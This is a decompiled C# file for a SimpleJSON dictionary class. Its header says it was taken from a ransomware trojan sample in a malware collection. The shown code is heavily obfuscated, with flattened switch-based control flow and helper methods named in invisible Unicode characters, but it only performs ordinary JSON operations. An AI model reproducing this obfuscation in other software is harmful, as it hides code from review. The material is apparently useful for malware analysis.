// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONClass
// Assembly: InternalSi, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: F44F14A9-876B-4F73-A898-F3E4E8A5FAFC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-054cde86997158b8d0515e30ca53b657ef96d212987a89f7eb3b76e7fe727d62.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace SimpleJSON
{
  public class JSONClass : JSONNode, IEnumerable
  {
    private Dictionary<string, JSONNode> m_Dict = new Dictionary<string, JSONNode>();

    public override JSONNode this[string aKey]
    {
      get
      {
label_1:
        int num1 = -1841985363;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1346731793)) % 6U)
          {
            case 1:
              jsonNode = this.m_Dict[aKey];
              num1 = (int) num2 * -1950703945 ^ 1627053428;
              continue;
            case 2:
              int num3 = !this.m_Dict.ContainsKey(aKey) ? 1831809076 : (num3 = 1415032168);
              num1 = num3 ^ (int) num2 * -1581973449;
              continue;
            case 3:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
              num1 = -268889987;
              continue;
            case 4:
              num1 = (int) num2 * -1155653160 ^ 1776931723;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_7:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = 510308200;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1246364749)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              this.m_Dict[aKey] = value;
              num1 = (int) num2 * -1377043108 ^ 447283284;
              continue;
            case 2:
              num1 = (int) num2 * 1786471275 ^ 2115637044;
              continue;
            case 3:
              int num3 = this.m_Dict.ContainsKey(aKey) ? 110630514 : (num3 = 1226776399);
              num1 = num3 ^ (int) num2 * -1542523554;
              continue;
            case 4:
              this.m_Dict.Add(aKey, value);
              num1 = 2098066393;
              continue;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public override JSONNode this[int aIndex]
    {
      get
      {
label_1:
        int num1 = 1554099448;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          bool flag;
          int num3;
          switch ((num2 = (uint) (num1 ^ 91942238)) % 7U)
          {
            case 0:
              jsonNode = (JSONNode) null;
              num1 = 39592595;
              continue;
            case 1:
              if (aIndex < 0)
              {
                num3 = 1;
                break;
              }
              num1 = (int) num2 * 1387385634 ^ 746132434;
              continue;
            case 2:
              int num4 = !flag ? -792809411 : (num4 = -244515802);
              num1 = num4 ^ (int) num2 * 992628699;
              continue;
            case 4:
              jsonNode = (JSONNode) null;
              num1 = (int) num2 * 1876765829 ^ 814075629;
              continue;
            case 5:
              goto label_1;
            case 6:
              num3 = aIndex >= this.m_Dict.Count ? 1 : 0;
              break;
            default:
              goto label_11;
          }
          flag = num3 != 0;
          num1 = 1159855716;
        }
label_11:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = -1321170144;
        while (true)
        {
          uint num2;
          bool flag;
          int num3;
          switch ((num2 = (uint) (num1 ^ -2072418507)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              if (aIndex >= 0)
              {
                num1 = (int) num2 * -383273619 ^ 15818139;
                continue;
              }
              num3 = 1;
              break;
            case 2:
              int num4 = !flag ? 669767676 : (num4 = 2023745251);
              num1 = num4 ^ (int) num2 * -1674336350;
              continue;
            case 3:
              num3 = aIndex >= this.m_Dict.Count ? 1 : 0;
              break;
            case 4:
              num1 = (int) num2 * -1970244622 ^ 496104128;
              continue;
            case 5:
              goto label_3;
            default:
              goto label_11;
          }
          flag = num3 != 0;
          num1 = -1619472451;
        }
label_3:
        return;
label_11:;
      }
    }

    public override int Count
    {
      get
      {
label_1:
        int num1 = -1216588664;
        int count;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -738431031)) % 4U)
          {
            case 0:
              num1 = (int) num2 * 687390627 ^ -1858930234;
              continue;
            case 1:
              count = this.m_Dict.Count;
              num1 = (int) num2 * -1507253625 ^ 710369242;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return count;
      }
    }

    public override void Add(string aKey, JSONNode aItem)
    {
label_1:
      int num1 = -1059172204;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -977746477)) % 15U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = -1149580171;
            continue;
          case 2:
            num1 = (int) num2 * 1109154570 ^ -956441537;
            continue;
          case 3:
            int num3 = flag2 ? -630782250 : (num3 = -811060013);
            num1 = num3 ^ (int) num2 * 1956555916;
            continue;
          case 4:
            this.m_Dict.Add(Guid.NewGuid().ToString(), aItem);
            num1 = -794786126;
            continue;
          case 5:
            this.m_Dict[aKey] = aItem;
            num1 = (int) num2 * -937692839 ^ 1202194589;
            continue;
          case 6:
            num1 = (int) num2 * 1945373201 ^ 2007027666;
            continue;
          case 7:
            int num4 = !flag1 ? -1558230879 : (num4 = -964507562);
            num1 = num4 ^ (int) num2 * 631893163;
            continue;
          case 8:
            this.m_Dict.Add(aKey, aItem);
            num1 = -1024883504;
            continue;
          case 9:
            goto label_1;
          case 10:
            num1 = (int) num2 * -1546000552 ^ 8760250;
            continue;
          case 11:
            flag1 = this.m_Dict.ContainsKey(aKey);
            num1 = (int) num2 * -2129002565 ^ 1396229485;
            continue;
          case 12:
            flag2 = !JSONClass.\u206E⁮⁪‭​‍‮‌⁯‍⁯‭‌‬​‬⁭⁫‮‪‭‬‮‪⁫⁯‪⁬⁬‍‎⁬⁭⁪‪‬‎‬⁫‭‮(aKey);
            num1 = (int) num2 * 237870192 ^ 2048705617;
            continue;
          case 13:
            num1 = (int) num2 * -1700361890 ^ -1423243080;
            continue;
          case 14:
            num1 = (int) num2 * -1484964083 ^ -2091415912;
            continue;
          default:
            goto label_17;
        }
      }
label_3:
      return;
label_17:;
    }

    public override JSONNode Remove(string aKey)
    {
label_1:
      int num1 = -2144923938;
      bool flag;
      JSONNode jsonNode1;
      JSONNode jsonNode2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -280562687)) % 10U)
        {
          case 0:
            jsonNode1 = this.m_Dict[aKey];
            num1 = -609984410;
            continue;
          case 1:
            flag = !this.m_Dict.ContainsKey(aKey);
            num1 = (int) num2 * 1246292532 ^ -1024661943;
            continue;
          case 2:
            num1 = (int) num2 * -1355750475 ^ 258878513;
            continue;
          case 3:
            goto label_1;
          case 4:
            int num3 = !flag ? 448073495 : (num3 = 1025173939);
            num1 = num3 ^ (int) num2 * 298238941;
            continue;
          case 5:
            num1 = (int) num2 * 1781684311 ^ 379464880;
            continue;
          case 6:
            jsonNode2 = (JSONNode) null;
            num1 = (int) num2 * -1857020203 ^ 1337926002;
            continue;
          case 7:
            jsonNode2 = jsonNode1;
            num1 = (int) num2 * -1088853858 ^ -567313199;
            continue;
          case 9:
            this.m_Dict.Remove(aKey);
            num1 = (int) num2 * -1658594631 ^ 2080518473;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return jsonNode2;
    }

    public override JSONNode Remove(int aIndex)
    {
      if (aIndex < 0)
        goto label_4;
label_1:
      int num1 = 348958321;
label_2:
      JSONNode jsonNode;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1327530199)) % 5U)
        {
          case 0:
            jsonNode = (JSONNode) null;
            num1 = (int) num2 * -695684248 ^ -2095279948;
            continue;
          case 1:
            jsonNode = (JSONNode) null;
            num1 = 1505722572;
            continue;
          case 2:
            goto label_1;
          case 4:
            goto label_3;
          default:
            goto label_8;
        }
      }
label_3:
      int num3 = aIndex >= this.m_Dict.Count ? 1 : 0;
      goto label_5;
label_8:
      return jsonNode;
label_4:
      num3 = 1;
label_5:
      num1 = num3 == 0 ? 1025149626 : (num1 = 881392700);
      goto label_2;
    }

    public override JSONNode Remove(JSONNode aNode)
    {
      JSONNode jsonNode;
      try
      {
label_2:
        int num1 = -1449381169;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1829783003)) % 3U)
          {
            case 1:
              jsonNode = (JSONNode) null;
              num1 = (int) num2 * -107353231 ^ 2076931863;
              continue;
            case 2:
              goto label_2;
            default:
              goto label_6;
          }
        }
      }
      catch
      {
        jsonNode = (JSONNode) null;
      }
label_6:
      return jsonNode;
    }

    public override IEnumerable<JSONNode> Childs => (IEnumerable<JSONNode>) new JSONClass.\u003Cget_Childs\u003Ed__14(-2)
    {
      \u003C\u003E4__this = this
    };

    public IEnumerator GetEnumerator() => (IEnumerator) new JSONClass.\u003CGetEnumerator\u003Ed__15(0)
    {
      \u003C\u003E4__this = this
    };

    public override string ToString()
    {
label_1:
      int num1 = -233589894;
      string str1;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -809780740)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            str1 = "{";
            num1 = (int) num2 * -86146668 ^ -1488293286;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      Dictionary<string, JSONNode>.Enumerator enumerator = this.m_Dict.GetEnumerator();
      try
      {
label_12:
        int num3 = !enumerator.MoveNext() ? -2117096638 : (num3 = -1857324051);
        KeyValuePair<string, JSONNode> current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 ^ -809780740)) % 8U)
          {
            case 0:
              goto label_12;
            case 1:
              current = enumerator.Current;
              num3 = -361841261;
              continue;
            case 2:
              num3 = (int) num4 * 418906704 ^ -1542930740;
              continue;
            case 3:
              str1 = JSONClass.\u206B‍‌‌‍‭‬⁪‎‭⁭​⁯⁮⁮‭‎‬​⁮⁪‎‏⁫⁮‬⁮​‮‬‍‬⁬‬⁮‬⁮‍​⁯‮(new string[5]
              {
                str1,
                "\"",
                JSONNode.Escape(current.Key),
                "\":",
                JSONClass.\u202A⁭​‍​‌‍⁪‮⁪⁮‌‮​⁫‌‏‎⁪‭⁭‮​​‌⁮⁪⁬‮‏⁯⁮‮‮​⁫‫‎‫‬‮((object) current.Value)
              });
              num3 = -238557714;
              continue;
            case 4:
              num3 = -1857324051;
              continue;
            case 5:
              str1 = JSONClass.\u202D‏‬‭‬‬‮⁮‍⁯‍‫⁫⁮‪⁬⁬‪​⁬‮‭‍⁪​‏‬‎‌⁫​‪‭‪‫⁭‬‎⁫‎‮(str1, ", ");
              num3 = (int) num4 * 968514319 ^ 1825998220;
              continue;
            case 7:
              int num5 = JSONClass.\u206A⁪⁪‏‪‍‭‮⁪⁫​‪‎‭​‏‭⁫‫‌‮⁬⁫‍⁭‫‎⁫‏‍​⁪⁯‮⁮⁯‬‌‎⁯‮(str1) > 2 ? -1016051864 : (num5 = -263655786);
              num3 = num5 ^ (int) num4 * -166414889;
              continue;
            default:
              goto label_19;
          }
        }
      }
      finally
      {
        enumerator.Dispose();
label_15:
        int num6 = -617928647;
        while (true)
        {
          uint num7;
          switch ((num7 = (uint) (num6 ^ -809780740)) % 3U)
          {
            case 0:
              goto label_15;
            case 2:
              num6 = (int) num7 * 1048567690 ^ -66594670;
              continue;
            default:
              goto label_18;
          }
        }
label_18:;
      }
label_19:
      string str2 = JSONClass.\u202D‏‬‭‬‬‮⁮‍⁯‍‫⁫⁮‪⁬⁬‪​⁬‮‭‍⁪​‏‬‎‌⁫​‪‭‪‫⁭‬‎⁫‎‮(str1, "}");
label_20:
      int num8 = -1160604946;
      string str3;
      while (true)
      {
        uint num9;
        switch ((num9 = (uint) (num8 ^ -809780740)) % 3U)
        {
          case 0:
            goto label_20;
          case 1:
            str3 = str2;
            num8 = (int) num9 * 1809683670 ^ 1800943136;
            continue;
          default:
            goto label_23;
        }
      }
label_23:
      return str3;
    }

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = 369320521;
      string str1;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1551293644)) % 4U)
        {
          case 1:
            str1 = "{ ";
            num1 = (int) num2 * -386748342 ^ 172558744;
            continue;
          case 2:
            num1 = (int) num2 * 291735572 ^ -981307564;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      using (Dictionary<string, JSONNode>.Enumerator enumerator = this.m_Dict.GetEnumerator())
      {
label_14:
        int num3 = !enumerator.MoveNext() ? 574096994 : (num3 = 1329986077);
        KeyValuePair<string, JSONNode> current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 ^ 1551293644)) % 8U)
          {
            case 0:
              num3 = 1329986077;
              continue;
            case 1:
              current = enumerator.Current;
              num3 = 441862371;
              continue;
            case 2:
              str1 = JSONClass.\u202D‏‬‭‬‬‮⁮‍⁯‍‫⁫⁮‪⁬⁬‪​⁬‮‭‍⁪​‏‬‎‌⁫​‪‭‪‫⁭‬‎⁫‎‮(str1, ", ");
              num3 = (int) num4 * 1375143489 ^ -1108674293;
              continue;
            case 3:
              num3 = (int) num4 * 1830500509 ^ -1805530673;
              continue;
            case 4:
              goto label_14;
            case 5:
              str1 = JSONClass.\u206B⁮‍‬⁮⁫‏‏‏‎‫⁯‎‍⁪‪⁪⁮‬‭‍‎⁭⁯⁬⁯‏‬‍‎⁪⁭‌‫‮⁮⁪‬⁮⁮‮(str1, "\n", aPrefix, "   ");
              str1 = JSONClass.\u206B‍‌‌‍‭‬⁪‎‭⁭​⁯⁮⁮‭‎‬​⁮⁪‎‏⁫⁮‬⁮​‮‬‍‬⁬‬⁮‬⁮‍​⁯‮(new string[5]
              {
                str1,
                "\"",
                JSONNode.Escape(current.Key),
                "\" : ",
                current.Value.ToString(JSONClass.\u202D‏‬‭‬‬‮⁮‍⁯‍‫⁫⁮‪⁬⁬‪​⁬‮‭‍⁪​‏‬‎‌⁫​‪‭‪‫⁭‬‎⁫‎‮(aPrefix, "   "))
              });
              num3 = 1004999655;
              continue;
            case 7:
              int num5 = JSONClass.\u206A⁪⁪‏‪‍‭‮⁪⁫​‪‎‭​‏‭⁫‫‌‮⁬⁫‍⁭‫‎⁫‏‍​⁪⁯‮⁮⁯‬‌‎⁯‮(str1) <= 3 ? -463001696 : (num5 = -120271129);
              num3 = num5 ^ (int) num4 * 1017298983;
              continue;
            default:
              goto label_16;
          }
        }
      }
label_16:
      string str2 = JSONClass.\u206B⁮‍‬⁮⁫‏‏‏‎‫⁯‎‍⁪‪⁪⁮‬‭‍‎⁭⁯⁬⁯‏‬‍‎⁪⁭‌‫‮⁮⁪‬⁮⁮‮(str1, "\n", aPrefix, "}");
label_17:
      int num6 = 1182536257;
      string str3;
      while (true)
      {
        uint num7;
        switch ((num7 = (uint) (num6 ^ 1551293644)) % 4U)
        {
          case 0:
            num6 = (int) num7 * -1337426078 ^ -622911713;
            continue;
          case 1:
            str3 = str2;
            num6 = (int) num7 * -1768778835 ^ 1632478985;
            continue;
          case 2:
            goto label_17;
          default:
            goto label_21;
        }
      }
label_21:
      return str3;
    }

    public override void Serialize(BinaryWriter aWriter)
    {
label_1:
      int num1 = -415285245;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1715022095)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1392520766 ^ -824235231;
            continue;
          case 2:
            JSONClass.\u206B⁪‍‫‎⁫⁬⁭⁬⁬‌‏‏⁭⁯‬‍‪​‭‌⁪‫‌‌‌‮⁯⁬‬‪​‭‭‍⁭‌‮⁪‎‮(aWriter, (byte) 2);
            num1 = (int) num2 * 1332393803 ^ 637006007;
            continue;
          case 4:
            JSONClass.\u202D⁮⁮‏‏‭⁬⁭⁬‫‏‮‫‏‪‮‍‏⁮‍‍⁬⁭‌​‍‏⁮‬‮‏⁪⁭‪‪‍‎⁮‍⁮‮(aWriter, this.m_Dict.Count);
            num1 = (int) num2 * 801035995 ^ 441647601;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      using (Dictionary<string, JSONNode>.KeyCollection.Enumerator enumerator = this.m_Dict.Keys.GetEnumerator())
      {
label_16:
        int num3 = enumerator.MoveNext() ? -948449317 : (num3 = -535859279);
        string current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 ^ -1715022095)) % 8U)
          {
            case 0:
              goto label_17;
            case 1:
              JSONClass.\u206E⁮​⁯⁪‮‭⁭⁯‮‭‏‌⁬‎⁪‮⁭‭‫‍⁭⁪⁮⁪‮‎⁬​‍​⁫⁮⁭‪‌‎‫⁫⁬‮(aWriter, current);
              num3 = (int) num4 * -2116217724 ^ 1206707262;
              continue;
            case 2:
              current = enumerator.Current;
              num3 = -443281248;
              continue;
            case 3:
              num3 = (int) num4 * -118908761 ^ -1313433789;
              continue;
            case 4:
              num3 = -948449317;
              continue;
            case 5:
              goto label_16;
            case 6:
              num3 = (int) num4 * 280485328 ^ 272804812;
              continue;
            case 7:
              this.m_Dict[current].Serialize(aWriter);
              num3 = (int) num4 * -2065053321 ^ 397907678;
              continue;
            default:
              goto label_10;
          }
        }
label_17:
        return;
label_10:;
      }
    }

    static bool \u206E⁮⁪‭​‍‮‌⁯‍⁯‭‌‬​‬⁭⁫‮‪‭‬‮‪⁫⁯‪⁬⁬‍‎⁬⁭⁪‪‬‎‬⁫‭‮([In] string obj0) => string.IsNullOrEmpty(obj0);

    static int \u206A⁪⁪‏‪‍‭‮⁪⁫​‪‎‭​‏‭⁫‫‌‮⁬⁫‍⁭‫‎⁫‏‍​⁪⁯‮⁮⁯‬‌‎⁯‮([In] string obj0) => obj0.Length;

    static string \u202D‏‬‭‬‬‮⁮‍⁯‍‫⁫⁮‪⁬⁬‪​⁬‮‭‍⁪​‏‬‎‌⁫​‪‭‪‫⁭‬‎⁫‎‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202A⁭​‍​‌‍⁪‮⁪⁮‌‮​⁫‌‏‎⁪‭⁭‮​​‌⁮⁪⁬‮‏⁯⁮‮‮​⁫‫‎‫‬‮([In] object obj0) => obj0.ToString();

    static string \u206B‍‌‌‍‭‬⁪‎‭⁭​⁯⁮⁮‭‎‬​⁮⁪‎‏⁫⁮‬⁮​‮‬‍‬⁬‬⁮‬⁮‍​⁯‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206B⁮‍‬⁮⁫‏‏‏‎‫⁯‎‍⁪‪⁪⁮‬‭‍‎⁭⁯⁬⁯‏‬‍‎⁪⁭‌‫‮⁮⁪‬⁮⁮‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3)
    {
      return obj0 + obj1 + obj2 + obj3;
    }

    static void \u206B⁪‍‫‎⁫⁬⁭⁬⁬‌‏‏⁭⁯‬‍‪​‭‌⁪‫‌‌‌‮⁯⁬‬‪​‭‭‍⁭‌‮⁪‎‮([In] BinaryWriter obj0, [In] byte obj1) => obj0.Write(obj1);

    static void \u202D⁮⁮‏‏‭⁬⁭⁬‫‏‮‫‏‪‮‍‏⁮‍‍⁬⁭‌​‍‏⁮‬‮‏⁪⁭‪‪‍‎⁮‍⁮‮([In] BinaryWriter obj0, [In] int obj1) => obj0.Write(obj1);

    static void \u206E⁮​⁯⁪‮‭⁭⁯‮‭‏‌⁬‎⁪‮⁭‭‫‍⁭⁪⁮⁪‮‎⁬​‍​⁫⁮⁭‪‌‎‫⁫⁬‮([In] BinaryWriter obj0, [In] string obj1) => obj0.Write(obj1);
  }
}
